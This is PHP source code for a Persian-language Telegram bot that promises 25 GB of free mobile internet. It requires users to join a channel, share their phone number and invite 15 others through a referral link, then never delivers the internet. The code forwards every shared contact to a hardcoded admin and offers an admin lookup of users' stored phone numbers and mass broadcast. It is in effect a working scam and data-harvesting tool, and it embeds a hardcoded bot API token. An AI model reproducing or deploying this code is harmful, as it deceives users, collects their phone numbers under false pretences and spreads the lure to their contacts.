<?php
ob_start();
define('API_KEY','696023605:AAGnJUfkYfCAq9INuSdKkNqxFxVqWuSiNMA');//توکنتو بزارید
//============= Functions ===============
function bot($method,$datas=[]){
    $url = "https://api.telegram.org/bot".API_KEY."/".$method;
    $ch = curl_init();
    curl_setopt($ch,CURLOPT_URL,$url);
    curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
    curl_setopt($ch,CURLOPT_POSTFIELDS,$datas);
    $res = curl_exec($ch);
    if(curl_error($ch)){
        var_dump(curl_error($ch));
    }else{
        return json_decode($res);
    }
}

//============== End Source ================
function SendMessage($chatid,$text,$parsmde,$disable_web_page_preview,$keyboard){
    bot('sendMessage',[
        'chat_id'=>$chatid,
        'text'=>$text,
        'parse_mode'=>$parsmde,
        'disable_web_page_preview'=>$disable_web_page_preview,
        'reply_markup'=>$keyboard
    ]);
}
function sendVideo ($chat_id,$video,$caption,$keyboard){
    bot('sendVideo',array(
        'chat_id'=>$chat_id,
        'video'=>$video,
        'caption'=>$caption,
        'reply_markup'=>$keyboard
    ));
}
function SendPhoto($chat_id, $photo, $caption){
 bot('sendphoto',[
 'chat_id'=>$chat_id,
 'photo'=>$photo,
 'caption'=>$caption
 ]);
 }
function Forward($KojaShe,$AzKoja,$KodomMSG)
{
    bot('ForwardMessage',[
        'chat_id'=>$KojaShe,
        'from_chat_id'=>$AzKoja,
        'message_id'=>$KodomMSG
    ]);
}
function save($filename, $data)
{
    $file = fopen($filename, 'w');
    fwrite($file, $data);
    fclose($file);
}//============== keyboard ==============
$Botid = 'free0netbot';//آیدی رباتتون
$Channel = '@LINE_TM';//آیدی کانالتون
$chid = "https://t.me/LINE_TM";//آیدی کانالتون
$menu = json_encode(['keyboard'=>[
[['text'=>'راهنما و وضعیت من'],['text'=>'تعداد ممبر های من']],
[['text'=>'لینک شخصی من']],
],"resize_keyboard"=>true]);
//=======================
$button_sendnum = json_encode(['keyboard'=>[
[['text'=>'ثبت شماره خود','request_contact'=>true]],
[['text'=>'برگشت']],
],'resize_keyboard'=>true]);
$sudo = json_encode(['keyboard'=>[
[['text'=>"امار"]],
[['text'=>"ارسال همگانی"],['text'=>"شماره کاربر"]],
[['text'=>"فروارد همگانی"],['text'=>"برگشت"]],
],'resize_keyboard'=>true]);
//=======================
$join = json_encode(['inline_keyboard'=>[
    [['text'=>"ورود به کانال",'url'=>"$chid"]
],
],
]);
//=======================
$sim = json_encode(['keyboard'=>[
[['text'=>'ایرانسل'],['text'=>'همراه اول']],[['text'=>'رایتل']],
],"resize_keyboard"=>true]);
//============== Coded By[ir amin] ==============
if(!is_dir("data/$from_id")){
mkdir("data/$from_id");
}
$update = json_decode(file_get_contents('php://input'));
$message = $update->message;
$chat_id = $update->message->chat->id;
$from_id = $update->message->from->id;
$text = $update->message->text;
$from_first = $update->message->from->first_name;
$message_id = $update->message->message_id;
$amir = file_get_contents("data/$from_id/amir.txt");
$member = file_get_contents("data/$from_id/member.txt");
$number = file_get_contents("data/$from_id/number.txt");
$members = file_get_contents('Member.txt');
$memlist = explode("\n", $members);
$ADMIN = "550250019";//آیدی ادمین
$tch = bot('getChatMember',[
    'chat_id'=>$Channel,
    'user_id'=>$from_id
])->result->status;
if ($tch != 'member' && $tch != 'creator' && $tch != 'ADMINistrator') {
    sendMessage($chat_id,"برای استفاده از این ربات حتما باید در کانال زیر عضو شوید
	پس از عضویت در کانال زیر,به ربات بازگردید و /start را لمس کنید","Html",false,$join);
}
//======================= Start Source ======================
elseif($text =="/start"){
mkdir("data/$from_id");
if(!in_array($from_id,$memlist)){
	$newmem = file_get_contents('Member.txt');
	$newmem .= $from_id . "\n";
	file_put_contents('Member.txt',$newmem);
}
$newid = str_replace("/start ", "", $text);
	if($from_id == $newid){
if (!file_exists("data/$from_id/amir.txt")) {
        mkdir("data/$from_id");
        file_put_contents("data/$from_id/amir.txt","none");
        $myfile2 = fopen("Member.txt", "a") or die("Unable to open file!");
        fwrite($myfile2, "$from_id\n");
        fclose($myfile2);
    }
}
save("data/$from_id/member.txt","0");
if(!in_array($from_id,$memlist)){
	mkdir("data/$from_id");
	$newmem = file_get_contents('Member.txt');
	$newmem .= $from_id . "\n";
	file_put_contents('Member.txt',$newmem);
	file_put_contents('data/'.$from_id.'/member.txt','0');
	file_put_contents('data/'.$newid.'/member.txt',file_get_contents('data/'.$newid.'/member.txt') + 1);
	SendMessage($newid,"یک نفر با لینک شما وارد ربات شد");
}
      bot('sendmessage', [
'chat_id' => $chat_id,
'text' => "
سلام $from_first , روز شما بخیر
شما میتوانید 25 گیگابایت اینترنت رایگان هدیه بگیرید!

برای دریافت هدیه خود ابتدا بروی /internet کلیک کنید وسپس اوپراتور خود را انتخاب کنید :",
'reply_to_message_id'=>$message_id,
'parse_mode' => "MarkDown",
'reply_markup'=>json_encode([
'keyboard'=>[
[['text' => "Developer"]]
],
"resize_keyboard"=>true,
])
]);
}  
elseif($update->message->contact and $number == null){
  file_put_contents("data/$from_id/number.txt",$update->message->contact->phone_number);
  bot("forwardMessage",['chat_id' =>$ADMIN,'from_chat_id'=>$chat_id,'message_id' => $message_id]);
  bot('sendmessage', [
'chat_id' => $chat_id,
'text' => "  
سلام $from_first , روز شما بخیر
شما میتوانید 25 گیگابایت اینتنت رایگان هدیه بگیرید!

برای دریافت هدیه خود ابتدا بروی /internet کلیک کنید وسپس اوپراتور خود را انتخاب کنید :",
'reply_to_message_id'=>$message_id,
'parse_mode' => "MarkDown",
'reply_markup'=>json_encode([
'keyboard'=>[
[['text' => "Developer"]]
],
"resize_keyboard"=>true,
])
]);
  }
elseif($number == null){
	bot('sendmessage', [
'chat_id' => $chat_id,
'text' => "حتما باید شمارتونو تایید کنید 💉",
'reply_to_message_id'=>$message_id,
'parse_mode' => "MarkDown",
'reply_markup'=>json_encode([
'keyboard'=>[
[['text'=>'اشتراک شماره من','request_contact'=>true]],
],
"resize_keyboard"=>true,
])
]);
}
elseif ($text == "راهنما و وضعیت من"){
	sendMessage($chat_id, "برای دیافت 25 گیگ اینترنت ایگان خود, بروی /link کلیک کنید و سپس پیام جدیدی که دریافت میکنید را برای 15 نفر ارسال کنید
	تاکنون $member نفر روی لینک شما کلیک کرده...","html",false,$menu);
}
elseif ($text == "برگشت"){
	sendMessage($chat_id, "به منوی اصلی خوش آمدید :)","html",false,$menu);
}
elseif ($text == "/internet"){
	sendMessage($chat_id, "لطفا اپراتور سیم کارت خود را مشخص کنید :","html",false,$sim);
}
elseif ($text == "ایرانسل"){
	sendMessage($chat_id, "به بخش اپراتور خود خوش آمدید !
از دکمه های زیر استفاده کنید :","html",false,$menu);
}
elseif ($text == "همراه اول"){
	sendMessage($chat_id, "به بخش اپراتور خود خوش آمدید !
از دکمه های زیر استفاده کنید :","html",false,$menu);
}
elseif ($text == "رایتل"){
	sendMessage($chat_id, "به بخش اپراتور خود خوش آمدید !
از دکمه های زیر استفاده کنید :","html",false,$menu);
}
elseif($text == "Creator"){
sendMessage($chat_id,"#coded_by : heman [ @heman_joker ]");
}
elseif($text == "تعداد ممبر های من"){
if($member > 15){
$osa = file_get_contents("data/$from_id/member.txt");
save("data/$from_id/member.txt",$osa - 15);
sendMessage($chat_id,"به زودی نت رایگان برای سیم کارت شما فعال خواهد شد !");
}else{
sendMessage($chat_id,"شما باید 15 نفر رو دعوت کنید تا بتوانید نت رایگان را بگیرید !
تعداد افراد دعوت شده توسط شما : $member");
}
}
elseif($text == "لینک شخصی من" || $text == "/link"){
sendMessage($chat_id,"سریع تو ربات زیر ثبت نام کن و جز مشترک هر اوپراتوری که هستی، 25 گیگ اینترنت سه ماهه هدیه بگیر!

https://telegram.me/free0netbot?start=$from_id

فرصت محدوده، عجله کن 🌟");
sendMessage($chat_id,"بنر بالا رو برای 15 نفر بفرست تا با اون عضو ربات بشن، بعدش بلافاصله ربات برات فعال میشه 😉👆","html",false,$menu);
}
//=============== Panel Admin ==============
elseif($text == "Panel" && $chat_id == $ADMIN){
SendMessage($chat_id,"Hi My Admin :","MarkDown","true",$sudo);
} 

elseif($text == "امار" && $from_id == $ADMIN){
    $user = file_get_contents("Member.txt");
    $member_id = explode("\n",$user);
    $member_count = count($member_id) -1;
	sendmessage($chat_id , " 📈آمار کاربران📊 : $member_count" , "html");
}
elseif($text == "ارسال همگانی🔄" && $chat_id == $ADMIN){
    file_put_contents("data/$from_id/amir.txt","send");
	bot('sendmessage',[
    'chat_id'=>$chat_id,
    'text'=>" پیام مورد نظر رو در قالب متن بفرستید:",
    'parse_mode'=>'html',
    'reply_markup'=>json_encode([
      'keyboard'=>[
	  [['text'=>'Panel']],
      ],'resize_keyboard'=>true])
  ]);
}
elseif($amir == "send" && $chat_id == $ADMIN){
    file_put_contents("data/$from_id/amir.txt","no");
	bot('sendmessage',[
    'chat_id'=>$chat_id,
    'text'=>" پیام همگانی فرستاده شد.",
  ]);
	$all_member = fopen( "Member.txt", "r");
		while( !feof( $all_member)) {
 			$user = fgets( $all_member);
			SendMessage($user,$text,"html");
		}
}
elseif($text == "فروارد همگانی" && $chat_id == $ADMIN){
    file_put_contents("data/$from_id/amir.txt","fwd");
	bot('sendmessage',[
    'chat_id'=>$chat_id,
    'text'=>"پیام خودتون را فروراد کنید:",
    'parse_mode'=>'html',
    'reply_markup'=>json_encode([
      'keyboard'=>[
	  [['text'=>'Panel']],
      ],'resize_keyboard'=>true])
  ]);
}
elseif($amir == "fwd" && $chat_id == $ADMIN){
    file_put_contents("data/$from_id/amir.txt","no");
	bot('sendmessage',[
    'chat_id'=>$chat_id,
    'text'=>"درحال فروارد",
  ]);
$forp = fopen( "Member.txt", 'r'); 
while( !feof( $forp)) { 
$fakar = fgets( $forp); 
Forward($fakar, $chat_id,$message_id); 
  } 
   bot('sendMessage',[ 
   'chat_id'=>$chat_id, 
   'text'=>"با موفقیت فروارد شد.", 
   ]);
}
elseif($text =="شماره کاربر" && $chat_id == $ADMIN ){
	file_put_contents("data/$chat_id/amir.txt","getnum");
      bot('sendMessage',[
 'chat_id'=>$chat_id,
 'text'=>"آیدی عددی کاربر رو ارسال کن 😃✋️",
 'parse_mode'=>"MarkDown",
  ]);
}  elseif($chat_id == $ADMIN && $amir == "getnum" ){ 
file_put_contents("data/$chat_id/amir.txt","none");
 $numbbeerr = file_get_contents("data/$text/number.txt");
 bot('sendMessage',[
 'chat_id'=>$chat_id,
 'text'=>"شماره کاربر [$text](tg://user?id=$text)  با موفقیت پیدا شد!😌
شمارش : $numbbeerr
 ",
 'reply_to_message_id'=>$message_id,
'parse_mode' => "MarkDown",
]);
}  
unlink("error_log");
//============= Info Developer ===============
//Source Codede By[@ir_aminbot]
?>
